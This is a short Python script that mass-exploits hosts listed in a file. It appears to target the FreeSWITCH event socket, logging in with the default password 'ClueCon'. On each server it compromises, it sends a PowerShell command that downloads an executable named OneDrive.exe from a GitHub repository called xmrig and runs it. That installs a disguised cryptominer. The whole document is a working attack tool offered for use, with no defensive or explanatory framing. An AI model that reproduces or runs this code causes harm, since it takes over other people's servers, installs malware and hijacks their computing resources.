from socket import *
import sys
import time
from concurrent.futures import ThreadPoolExecutor

PASSWORD = 'ClueCon'
THREADS = 150
IPS_FILE = "ips.txt"

def exploit(ip, port):
    try:
        s = socket(AF_INET, SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, int(port)))

        response = s.recv(1024)
        if b'auth/request' in response:
            s.send(bytes('auth {}\n\n'.format(PASSWORD), 'utf8'))
            response = s.recv(1024)
            if b'+OK accepted' in response:
                s.send(bytes('api system powershell -Command "$f=$env:TEMP+\'\\OneDrive.exe\';(New-Object Net.WebClient).DownloadFile(\'https://raw.githubusercontent.com/Matrix2077v2/xmrig/refs/heads/main/OneDrive.exe\',$f);Start-Process $f"\n\n', 'utf-8'))
                s.recv(8096)
                time.sleep(10)
                print(f"[+] {ip}:{port} — успешно")
        s.close()
    except Exception:
        pass

def main():
    with open(IPS_FILE) as f:
        targets = [line.strip().split(":") for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        for ip, port in targets:
            executor.submit(exploit, ip, port)

if __name__ == "__main__":
    main()
